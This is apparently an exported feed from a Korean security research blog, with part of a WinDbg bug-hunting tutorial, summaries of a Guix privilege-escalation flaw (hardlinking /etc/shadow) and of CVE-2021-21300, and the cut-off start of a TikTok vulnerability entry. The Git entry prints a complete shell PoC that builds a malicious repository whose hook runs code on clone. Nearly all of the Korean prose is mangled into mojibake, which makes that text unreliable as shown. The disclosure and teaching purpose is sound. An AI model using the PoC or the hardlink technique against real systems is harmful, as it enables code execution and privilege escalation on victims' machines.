ë¶€ë¶„ì€ ë¦¬ë²„ì‹±ì„ í•´ë´ì•¼ì§€ ì–´ë–¤ ì—­í• ì„ í•˜ëŠ”ì§€ ì•Œ ìˆ˜ ìˆê² ë„¤ìš”.</p><p>ë³¸ê²©ì ìœ¼ë¡œ ë¦¬ë²„ì‹±ì„ ì§„í–‰í•  ê±´ë° ì‚¬ì‹¤ ë¦¬ë²„ì‹±ì„ í•˜ê¸° ì „ í˜¹ì€ í•˜ë©´ì„œ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ìƒê°í•˜ê³  ë¦¬ë²„ì‹±ì„ ì§„í–‰í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ì–´ëŠ ì •ë„ëŠ” ì¶”ì¸¡ì„ í•˜ê³  ì‹œë‚˜ë¦¬ì˜¤ëŒ€ë¡œ ë¦¬ë²„ì‹±ì„ í•˜ë©´ í™•ì‹¤ì´ ê·¸ëƒ¥ ë§‰ë¬´ê°€ë‚´ë¡œ í•˜ëŠ” ê²ƒë³´ë‹¤ëŠ” ì‹œê°„ì´ ëœ ì†Œëª¨ë˜ê³  í™”ê°€ ëœ ë‚©ë‹ˆë‹¤ ã…ã… ì—¬ê¸°ì—ì„œëŠ” ì¼ë¶€ë¡œ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì‘ì„± ì•ˆ í•˜ê³  ì§„í–‰í•  ê²ƒì´ì§€ë§Œ ì´ ê¸€ì„ ë‹¤ ì½ê³  ì‹¤ì œë¡œ ì§„í–‰í•  ë•Œì—ëŠ” ëŒ€ëµì ì¸ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ìƒê°í•´ë‘ê³  ì§„í–‰í•˜ë©´ ì¢‹ê² ì£ .</p><p>ê·¸ëŸ¼ ì´ì œ ë””ë²„ê±°ì— ë¶™ì—¬ì„œ ë¦¬ë²„ì‹±ì„ í•´ë³¼ê²Œìš”. ì—¬ê¸°ì—ì„œ ë””ë²„ê¹…ì€ ëª¨ë‘ windbgë¥¼ ì‚¬ìš©í•˜ê² ìŠµë‹ˆë‹¤.</p><p>ì²˜ìŒ ë²„ê·¸í—ŒíŒ…ì„ í•  ë•Œì—ëŠ” ì´ì „ë¶€í„° ì¨ì˜¤ê¸°ë„ í–ˆê³  GUI ê°€ í•œëˆˆì— ë”± ë“¤ì–´ì™€ì„œ ì´ë®¤ë‹ˆí‹°ë¥¼ ì“°ê¸´ í–ˆëŠ” ë° ì†ë„ ë¬¸ì œ ë•Œë¬¸ì— windbgë¡œ ë„˜ì–´ì™”ìŠµë‹ˆë‹¤. íŠ¹íˆ ìµìŠ¤ í•  ë•Œ ìŠ¤í”„ë ˆì´ë¥¼ í•´ì•¼ í•˜ëŠ” ë° ì •ë§ ì† í„°ì ¸ì„œ;;; ì œ ê°€ìƒ ë¨¸ì‹ ì˜ ì‚¬ì–‘ì´ ë‚®ì•„ì„œë„ ìˆê² ì§€ë§Œ ì•„ì˜ˆ ë»—ì–´ë²„ë¦¬ë”ë¼êµ¬ìš”. ê·¸ë˜ì„œ windbgë¥¼ ì‚¬ìš©í–ˆë”ë‹ˆ ì‹œê°„ì´ ë§ì´ ë‹¨ì¶•ë˜ì—ˆìŠµë‹ˆë‹¤. ì“°ë‹¤ ë³´ë‹ˆê¹Œ ì›í•˜ëŠ” ê±°ë¥¼ ëª…ë ¹ì–´ë§Œ ê°„ë‹¨í•˜ê²Œ ì¹˜ë©´ ì›í•˜ëŠ” ê²ƒë§Œ ë”± ë³¼ ìˆ˜ ìˆì–´ì„œ í¸í•˜ê¸°ë„ í•´ê³ â€¦ ì§€ê¸ˆê¹Œì§€ ì“°ê³  ìˆë„¤ìš” ã…‹ã…‹ ì²˜ìŒì—ëŠ” CUIë¼ëŠ” ê²Œ ì¢€ ë§ì´ ì–´ìƒ‰í•˜ê¸´ í•˜ì§€ë§Œ í¬ë˜ì‹œ ë¶„ì„í•˜ë©´ì„œ ê³„ì† ì“°ë‹¤ ë³´ë©´ ìµìˆ™í•´ì§‘ë‹ˆë‹¹.  </p><p><a href="http://windbg.info/doc/1-common-cmds.html">http://windbg.info/doc/1-common-cmds.html</a> </p><p>windbg ì“¸ ë•Œ ìœ„ ë§í¬ë¥¼ ì˜†ì— ë„ì›Œë†“ê³  ì›í•˜ëŠ” ê±° í•˜ë‚˜í•˜ë‚˜ ì°¾ì•„ê°€ë©´ì„œ ì¨ë³´ì‹œë©´ ë„ì›€ì´ ë§ì´ ë  ê±° ê°™ë„¤ìš”. ì²˜ìŒì—ëŠ” ë³´ë©´ì„œ í•˜ë‹¤ê°€ ë‚˜ì¤‘ì—ëŠ” ì•ˆ ë³´ê³ ë„ ì˜ ì“°ëŠ” ë‚˜ ìì‹ ì„ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ ã…‹ã…‹ã…‹</p><p>ê·¸ëŸ¼ ì•„ê¹Œ ì§ì ‘ ì œì‘í•œ íŒŒì¼ì— ë˜‘ê°™ì´ ê°’ë“¤ì„ ìœ„ ê°’ë“¤ë¡œ ë°”ê¾¸ê³  ë¹„íŠ¸ë§µ ë¶€ë¶„ì„ ëª¨ë‘ <code>0x41</code>ë¡œ ë°”ê¾¼ ë‹¤ìŒ ë””ë²„ê±°ë¡œ ë³´ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--020.png" alt="./bughunting-tutorials-part3/image--020.png"></p><p><code>eax</code>ê°€ ìš°ë¦¬ê°€ ë„£ì€ <code>0x41414141</code>ë¡œ ë°”ë€Œì—ˆë„¤ìš”. ê·¸ëŸ¼ ì´ ê°’ì´ ì–´ë””ì„œ ì˜¤ëŠ”ì§€ ë´…ì‹œë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--022.png" alt="./bughunting-tutorials-part3/image--022.png"></p><p>í˜„ì¬ <code>eip</code> ë°”ë¡œ ìœ„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ë³´ë©´ <code>esp</code>ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì—ì„œ <code>eax</code>ê°’ì„ ê°€ì ¸ì˜¤ë„¤ìš”. ì‰ ê·¼ë° ì—¬ê¸° ìŠ¤íƒì¸ë°???(ì´ê±° ìŠ¤íƒ ì˜¤ë²„ ì·¨ì•½ì  ì•„ë‹ˆì—ˆëŠ”ë°;;;)<br>ê·¸ëŸ¼ ìš°ë¦¬ê°€ ë§Œë“  íŒŒì¼ì´ ì–´ë””ì— ë¡œë“œë˜ì—ˆëŠ”ì§€ ë³¼ê²Œìš”.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--024.png" alt="./bughunting-tutorials-part3/image--024.png"></p><p>ë­”ê°€ ë§¤ìš° ë§ì´ ìˆë„¤ìš”;;; ë¹„íŠ¸ë§µ ì •ë³´ê°€ ì „ì²´ì ìœ¼ë¡œ ì˜¬ë¼ì™€ ìˆëŠ” ê±´ <code>0x0725f056</code> ~ <code>0x0753b70d</code> ì •ë„ì¸ ê±° ê°™ë„¤ìš”. ê·¸ë¦¬ê³  ìŠ¤íƒì— ìˆëŠ” ë°ì´í„°ëŠ” ì´ ì¤‘ ì–´ë”˜ê°€ì—ì„œ ê°’ì„ ê°€ì ¸ì˜¨ ê±¸ë¡œ ë³´ì´ê³ ìš”. ì•„ì§ì€ ë­” ê°ˆ ì•Œ ìˆ˜ëŠ” ì—†ë„¤ìš”. ì´ì œ ì½œ ìŠ¤íƒì„ ë³´ë©´ì„œ ì˜¤ë²„í”Œë¡œìš°ê°€ ì–´ë””ì—ì„œ ë°œìƒí–ˆëŠ”ì§€ í™•ì¸í•´ ë´…ì‹œë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--026.png" alt="./bughunting-tutorials-part3/image--026.png"></p><p>ì—¬ê¸°ì„œ ì£¼ì˜í•´ì•¼ í•  ê²ƒì€ ì € <code>WARNING</code>ì´ë¼ê³  ëœ¬ ë¶€ë¶„ì¸ë°ìš”. ë””ë²„ê±°ì—ì„œ ì½œ ìŠ¤íƒì„ í”„ë¡œê·¸ë¨ ì¹´ìš´í„°ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ë³´ì—¬ì£¼ëŠ”ë° ì´ê²Œ ì˜ëª»ë˜ì–´ì„œ ì œëŒ€ë¡œ ëª» ë³´ì—¬ì£¼ëŠ” ê²ë‹ˆë‹¤. ë”°ë¼ì„œ ì €ëŒ€ë¡œ ë”°ë¼ê°€ë„ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ì•Œ ìˆ˜ê°€ ì—†ìŠµë‹ˆë‹¤. ê·¸ëŸ¼ ì–´ë–»ê²Œ ë¶„ì„ì„ í•´ì•¼ í• ê¹Œìš” ã… ã… ã… </p><p>ë³´í†µ ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•˜ëŠ” ë°©ë²•ì€ ë‘ ê°€ì§€ê°€ ìˆëŠ” ë° â€œíƒ‘ë‹¤ìš´â€ ë°©ì‹ê³¼ â€œë°”í…€ì—…â€œ ë°©ì‹ì´ ìˆìŠµë‹ˆë‹¤.(ë‹¹ì—°íˆ ìœ„ì—ì„œ ì•„ë˜ë¡œ ì•„ë˜ì—ì„œ ìœ„ë¡œ ê°€ì§€ ì¢Œìš°ë¡œ ê°ˆ ìˆœ ì—†ì–ì•„ìš”?)</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--028.png" alt="./bughunting-tutorials-part3/image--028.png"></p><p>ë­ ì•”íŠ¼ í¬ë˜ì‹œê°€ ë‚œ ê·¸ í•¨ìˆ˜ì—ì„œ ìœ„ë¡œ ì˜¬ë¼ê°€ë©´ì„œ ë³¼ ê²ƒì´ëƒ ì•„ë‹ˆë©´ í¬ë˜ì‹œê°€ ë‚˜ëŠ” ë¶€ë¶„ ì¢€ ìœ„ì—ì„œë¶€í„° ëª¨ë“  ì½”ë“œë¥¼ ë³¼ ê²ƒì´ëƒê°€ ë¬¸ì œì¸ë°â€¦ ì´ê±°ëŠ” ê°ìì˜ ì„±í–¥ í˜¹ì€ ìƒí™©ì— ë”°ë¼ ê²°ì •í•˜ì‹œë©´ ë©ë‹ˆë‹¤. ìµœëŒ€í•œ ë¶„ì„ ë²”ìœ„ë¥¼ ì¤„ì—¬ì„œ ë¦¬ë²„ì‹± ì‹œê°„ì„ ë‹¨ì¶•ì‹œí‚¤ëŠ” ê²Œ ì œì¼ í˜„ëª…í•œ ì„ íƒì´ì§€ë§Œ ì € ê°™ì€ ê²½ìš°ëŠ” ë‹¤ë¥¸ ì·¨ì•½ì ë„ ì°¾ì„ ê²¸ íƒ‘ë‹¤ìš´ ë°©ì‹ì„ ì„ í˜¸í•˜ëŠ” í¸ì…ë‹ˆë‹¤.(ì‹œê°„ ì¡¸ë¼ ì˜¤ë˜ ê±¸ë¦¬ì§€ë§Œâ€¦.) ì£¼ì˜í•´ì•¼ í•  ê²ƒì€ íƒ‘ë‹¤ìš´ ë°©ì‹ì„ ì§„í–‰í•  ë•Œ ì–´ë””ì„œë¶€í„° í• ì§€ ì˜ ì •í•´ì•¼ í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. dib í¬ë§·ì˜ ê²½ìš°ì—ëŠ” ì›Œë‚™ êµ¬ì¡°ê°€ ë‹¨ìˆœí•´ì„œ ë¶„ì„í•´ì•¼ í•  ì½”ë“œ ì»¤ë²„ë¦¬ì§€ê°€ ì‘ì§€ë§Œ ë‹¤ë¥¸ í¬ë§·ì˜ ê²½ìš° ë¶„ì„í•´ì•¼ í•  ì½”ë“œëŸ‰ì´ ë°©ëŒ€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë ‡ê¸° ë•Œë¬¸ì— ë¶„ì„í•  ë®¤í…Œì´íŠ¸ ëœ ë°”ì´íŠ¸ë¥¼ ì‚¬ìš©í•˜ëŠ” ë¶€ë¶„ì„ ì°¾ê³  ì–´ë–¤ ì‘ì—…ì„ í•˜ëŠ”ì§€ íŒŒì•…í•œ ë‹¤ìŒ, ê·¸ ë¶€ë¶„ì„ ì²˜ë¦¬í•˜ëŠ” ì½”ë“œì˜ ì‹œì‘ ë¶€ë¶„ì„ ì°¾ì•„ë‚´ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤ ã…‹ã…‹ã…‹</p><p>ê·¸ëŸ¼ ì´ì œ ì²˜ìŒ í•´ì„í•˜ëŠ” ë¶€ë¶„ì„ ì°¾ì•„ì•¼ í•˜ëŠ”ë° í—¤ë” ë¶€ë¶„ì´ BMì´ì—ˆì£ ? ë¶„ëª… ì½”ë“œì— í—¤ë”ë¥¼ ë¹„êµí•˜ëŠ” ë¶€ë¶„ì´ ìˆê² ì£ . ê·¸ë˜ì„œ ì•„ì´ë‹¤ì—ì„œ <code>BM</code>ì´ë¼ëŠ” ë¬¸ìì—´ì´ ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--030.jpg" alt="./bughunting-tutorials-part3/image--030.jpg"></p><p>ëŠ”â€¦ ë§.. ì—†ë„¤â€¦. ë‹¤ë¥¸ ê±´ ë‹¤ ìˆë˜ë°â€¦ ì—­ì‹œ ì¸ìƒì€ ë‚´ ë§˜ëŒ€ë¡œ ì•ˆë˜ëŠ”êµ°â€¦ ê·¸ëŸ¼ ì´ì œ í¸í•œ ë°©ë²•ì´ ì—†ìœ¼ë‹ˆ ì§ì ‘ ì°¾ì•„ë³´ë„ë¡ í•©ì‹œë‹¤ ã… ã… </p><p>ì½œ ìŠ¤íƒì´ ì œëŒ€ë¡œ ë‚˜ì˜¤ì§€ ì•Šìœ¼ë©´ í•˜ë‚˜í•˜ë‚˜ ë³¼ ìˆ˜ë°–ì— ì—†ìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--032.png" alt="./bughunting-tutorials-part3/image--032.png"></p><p>ì´ì¤‘ì— ì•„ë¬´ê±°ë‚˜ í•œ ë²ˆ ë³¼ê²Œìš”. </p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--034.png" alt="./bughunting-tutorials-part3/image--034.png"></p><p>ë¦¬í„´ ì–´ë“œë ˆìŠ¤ë¼ë©´ ë°”ë¡œ ìœ„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ <code>call</code>ì´ì–´ì•¼ í•˜ëŠ”ë° <code>ret</code>ì´ë„¤ìš”. ì´ ì£¼ì†ŒëŠ” ìš°ì—°íˆ ê·¸ëƒ¥ ê·¸ ëª¨ë“ˆì„ ê°€ë¦¬í‚¤ê³  ìˆì„ ë¿ì…ë‹ˆë‹¤. ì €ë ‡ê²Œ <code>dds</code> ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•´ì„œ ë³´ì´ëŠ” ì£¼ì†Œë“¤ì´ ëª¨ë‘ ë¦¬í„´ ì–´ë“œë ˆìŠ¤ì¸ ê²ƒë§Œì€ ì•„ë‹™ë‹ˆë‹¤. ë”°ë¼ì„œ í•˜ë‚˜í•˜ë‚˜ í™•ì¸ì„ í•˜ê³  ë””ë²„ê¹…ì„ ì§„í–‰í•´ì•¼ í•©ë‹ˆë‹¤. ìŠ¤íƒ ì¢€ ìœ„ì—ì„œ ìœ íš¨í•œ ë¦¬í„´ ì–´ë“œë ˆìŠ¤ë¥¼ ì°¾ì•„ë´…ì‹œë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--036.png" alt="./bughunting-tutorials-part3/image--036.png"></p><p>ì´ ë¦¬í„´ ì–´ë“œë ˆìŠ¤ëŠ” ê´œì°®ì€ ê±° ê°™ë„¤ìš”! ê·¸ëŸ¼ ì—¬ê¸°ì— ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ë¥¼ ê±¸ê³  ë””ë²„ê¹…ì„ í•´ë´…ì‹œë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--038.png" alt="./bughunting-tutorials-part3/image--038.png"></p><p>ì²˜ìŒì—ëŠ” ì´ë ‡ê²Œ ëœ¨ë©´ì„œ ë¡œë”©ì´ ì¢€ ëŠë¦¬ê²Œ ë˜ëŠ”ë° <code>sxe ld ImLoader.dll</code> ëª…ë ¹ì–´ë¥¼ ì¹˜ë©´ <code>ImLoader.dll</code> ì´ ë¡œë“œë  ë•Œ ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ë¥¼ ê±¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë ‡ê²Œ ë˜ë©´ ì €ë ‡ê²Œ ëŠë¦¬ê²Œ ë¡œë”©ë˜ì§€ëŠ” ì•Šê² ì£ . ëª¨ë“ˆì´ ë¡œë“œë˜ê³  ë¸Œí¬ë¥¼ ê±¸ê²Œ ë˜ë©´ ì¢€ ë” ë¹ ë¥´ê²Œ ì§„í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--040.png" alt="./bughunting-tutorials-part3/image--040.png"></p><p>ì •ìƒì ìœ¼ë¡œ ì›í•˜ëŠ” ì§€ì ì—ì„œ ì˜ ê±¸ë¦¬ë„¤ìš”. ê·¸ëŸ¼ íŒŒì¼ì´ ì—…ë¡œë“œë˜ì—ˆëŠ”ì§€ ë´…ì‹œë‹¤.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--042.png" alt="./bughunting-tutorials-part3/image--042.png"></p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--044.png" alt="./bughunting-tutorials-part3/image--044.png"></p><p>ì´ ì¤‘ ë‘ ë¶€ë¶„ë§Œ í—¤ë” ì •ë³´ë¥¼ ê°€ì§€ê³  ìˆë„¤ìš”. ê·¸ëŸ¼ í—¤ë”ê¹Œì§€ ìˆëŠ” ë©”ëª¨ë¦¬ì—ì„œ í—¤ë” ë¶€ë¶„ì— ë©”ëª¨ë¦¬ ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ë¥¼ ê±¸ê³  ì•ìœ¼ë¡œ ì‹¤í–‰í•˜ëŠ” ê³¼ì •ì—ì„œ ì–´ëŠ ë¶€ë¶„ì˜ ì½”ë“œì—ì„œ í•´ë‹¹ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•˜ëŠ”ì§€ë¥¼ ë³¼ê²Œìš”.</p><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/image--046.png" alt="./bughunting-tutorials-part3/image--046.png"></p><p>â€¦ëŠ” Failâ€¦. ê´œì°®ì•„ìš”â€¦ ì´ëŸ´ ìˆ˜ ìˆì£ â€¦. ê¼¼ìˆ˜ ì“°ì§€ ë§ê³  ì½”ë“œ ë¶„ì„í•˜ë¼ëŠ” ì‹ ì˜ ê³„ì‹œì…ë‹ˆë‹¤. ì•„ë§ˆ íŒŒì¼ ìŠ¤íŠ¸ë¦¼ì—ì„œ ë‹¤ì‹œ ê°€ì ¸ì™€ ë¹„êµë¥¼ í•˜ê±°ë‚˜ ë‹¤ì‹œ ë‹¤ë¥¸ ê³³ì— í• ë‹¹í•˜ê±°ë‚˜â€¦ ì•„ë‹ˆë©´ ì—¬ê¸°ë„ ì œì¼ ìœ„ê°€ ì•„ë‹ˆê±°ë‚˜â€¦ ì—¬ëŸ¬ ì‹œë‚˜ë¦¬ì˜¤ê°€ ìˆì„ ìˆ˜ ìˆê² ë„¤ìš”. ë­ ë‹¤ë¥¸ ë° ë¸Œí¬ ê±¸ì–´ì„œ í•  ìˆ˜ë„ ìˆì§€ë§Œ ë‹¤ë¥¸ ë°©ë²•ë„ ì¨ë³¼ê²Œìš”. ê·¸ ë‹¤ë¥¸ ë°©ë²•ì€ Part 4ì—ì„œ ì„¤ëª…í•˜ê² ìŠµë‹ˆë‹¤. </p><h1 id="Part-4-ì˜ˆê³ "><a href="#Part-4-ì˜ˆê³ " class="headerlink" title="Part 4 ì˜ˆê³ "></a>Part 4 ì˜ˆê³ </h1><p><img src="/2021/03/24/l0ch/bughunting-tutorials-part3/Untitled%203.png" alt="./bughunting-tutorials-part3/Untitled%203.png"></p><blockquote><p>EIPê°€ ì•ˆì¡íˆì–ì•„!!!!</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Guix lpe via guix-daemon</title>
    <link href="/2021/03/24/fabu1ous/2021-03-24/"/>
    <url>/2021/03/24/fabu1ous/2021-03-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://guix.gnu.org/en/blog/2021/risk-of-local-privilege-escalation-via-guix-daemon/">Risk of local privilege escalation via guix-daemon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Guix</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>GuixëŠ” GNU í”„ë¡œì íŠ¸ì—ì„œ ê°œë°œí•œ GNU ìš´ì˜ ì²´ì œì…ë‹ˆë‹¤. Guixì˜ guix-daemonì—ì„œ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆëŠ” ë³´ì•ˆ ì·¨ì•½ì„±ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Multi-user setupì´ ëœ ë¡œì»¬ ì‹œìŠ¤í…œ í™˜ê²½ì—ì„œ ìœ ì € ê¶Œí•œì˜ í•´ì»¤ëŠ” guix buildì™€ ê°™ì€ ë¹Œë“œ í”„ë¡œì„¸ìŠ¤ë¥¼ ìƒì„±í•´ ì„ì˜ì˜ íŒŒì¼ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ world-writableë¡œ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>ë¹Œë“œ ë””ë ‰í„°ë¦¬ ì†ì— <code>/etc/shadow</code>ì™€ ê°™ì´ root ì†Œìœ ì˜ íŒŒì¼ì˜  hardlinkë¥¼ ìƒì„±</li><li><code>--keep-failed</code> ì˜µì…˜ì„ ë¶™ì¸ ë¹Œë“œ í”„ë¡œì„¸ìŠ¤ í˜¸ì¶œ</li><li>ë¹Œë“œ ì‹¤íŒ¨ ì‹œ daemonì€ ì „ì²´ ë¹Œë“œ íŠ¸ë¦¬ë¥¼ í˜„ì¬ ìœ ì € ì†Œìœ ë¡œ ë³€ê²½</li><li>hardlink ëœ root ì†Œìœ ì˜ íŒŒì¼ì— ì“°ê¸° ê¶Œí•œì´ ìƒê¹€</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>lpe</tag>
      
      <tag>gnu</tag>
      
      <tag>multi-user</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-21300: Gitì˜ ì €ì¥ì†Œ clone ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/03/23/l0ch/2021-03-23/"/>
    <url>/2021/03/23/l0ch/2021-03-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.openwall.com/lists/oss-security/2021/03/09/3">git: malicious repositories can execute remote code while cloning</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Git(2.14.2.windows.1ì—ì„œ í…ŒìŠ¤íŠ¸ë¨)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì˜¤í”ˆì†ŒìŠ¤ ë²„ì „ ê´€ë¦¬ ì‹œìŠ¤í…œì¸ Gitì—ì„œ ì›ê²© ì €ì¥ì†Œë¥¼ clone í•˜ëŠ” ë„ì¤‘ ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ ê´€ë ¨ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì˜ íŠ¸ë¦¬ê±° ì¡°ê±´ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ul><li><p>íƒ€ê¹ƒ ì‹œìŠ¤í…œì´ NTFSì™€ ê°™ì´ ëŒ€ì†Œë¬¸ìë¥¼ êµ¬ë¶„í•˜ì§€ ì•Šê³ , ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì§€ì›í•´ì•¼ í•©ë‹ˆë‹¤.(Windows ë° macOSì˜ ê¸°ë³¸ íŒŒì¼ ì‹œìŠ¤í…œ)</p></li><li><p>Git LFSì™€ ê°™ì´ clean í˜¹ì€ smudge í•„í„°ê°€ ì „ì—­ì ìœ¼ë¡œ êµ¬ì„±ë˜ì–´ìˆì–´ì•¼ í•©ë‹ˆë‹¤.</p></li></ul><p>ì•…ì„± ì €ì¥ì†Œë¥¼ ìƒì„±í•˜ëŠ” PoCëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span>  git init delayed-checkout &amp;&amp;  (  <span class="hljs-built_in">cd</span> delayed-checkout &amp;&amp;  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;A/post-checkout filter=lfs diff=lfs merge=lfs&quot;</span> \\  &gt;.gitattributes &amp;&amp;  mkdir A &amp;&amp;  <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;#!/bin/sh\\n\\necho PWNED &gt;&amp;2\\n&#x27;</span> &gt;A/post-checkout &amp;&amp;  chmod +x A/post-checkout &amp;&amp;  &gt;A/a &amp;&amp;  &gt;A/b &amp;&amp;  git add -A &amp;&amp;  rm -rf A &amp;&amp;  ln -s .git/hooks a &amp;&amp;  git add a &amp;&amp;  git commit -m initial  )</code></pre><ol><li><p>ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ì•…ì„± íŒŒì¼ì¸ <code>A/post-checkout</code>ì´ ì €ì¥ì†Œì— ì¶”ê°€ëœ í›„ ì œê±°ë˜ë©´ Git ìºì‹œì— ë‚¨ìŠµë‹ˆë‹¤. ì´í›„ <code>./git/hooks</code>ì˜ ì‹¬ë³¼ë¦­ ë§í¬ <code>a</code>ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.</p><ul><li>git hooks - íŠ¹ì • ì´ë²¤íŠ¸ì— ì‹¤í–‰ë˜ëŠ” ìŠ¤í¬ë¦½íŠ¸</li></ul></li><li><p>íƒ€ê¹ƒì´ ëŒ€ì†Œë¬¸ìë¥¼ êµ¬ë¶„í•˜ì§€ ì•ŠëŠ” íŒŒì¼ ì‹œìŠ¤í…œì´ë¼ë©´ í•´ë‹¹ ì €ì¥ì†Œë¥¼ clone í•  ë•Œ <code>a</code>ì™€ <code>A</code>ë¥¼ êµ¬ë¶„í•˜ì§€ ëª»í•´ <code>./git/hooks/post-checkout</code> íŒŒì¼ì´ Git ìºì‹œì— ì €ì¥ëœ ì•…ì„±íŒŒì¼ì¸ <code>A/post-checkout</code>ë¡œ ëŒ€ì²´ë©ë‹ˆë‹¤.</p></li><li><p>git hooksì— ì˜í•´ <code>post-checkout</code>ê°€ ì‹¤í–‰ë˜ê³  <code>post-checkout</code>ì— ì‘ì„±ëœ ì„ì˜ ì½”ë“œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</p></li></ol><p><img src="/2021/03/23/l0ch/2021-03-23/image.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>POC - <a href="https://github.com/Maskhe/CVE-2021-21300">https://github.com/Maskhe/CVE-2021-21300</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>git</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] ì•ˆë“œë¡œì´ë“œ í‹±í†¡ ì•±ì—ì„œ ë°œê²¬ëœ 5ê°€ì§€ ì·¨ì•½ì </title>
    <link href="/2021/03/22/idioth/2021-03-22/"/>
    <url>/2021/03/22/idioth/2021-03-22/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105">TikTok for Android 1-Click RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>TikTok for Android Application</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì•ˆë“œë¡œì´ë“œ í‹±í†¡ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ 5ê°€ì§€ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ë°œê²¬ëœ 5ê°€ì§€ ì·¨ì•½ì  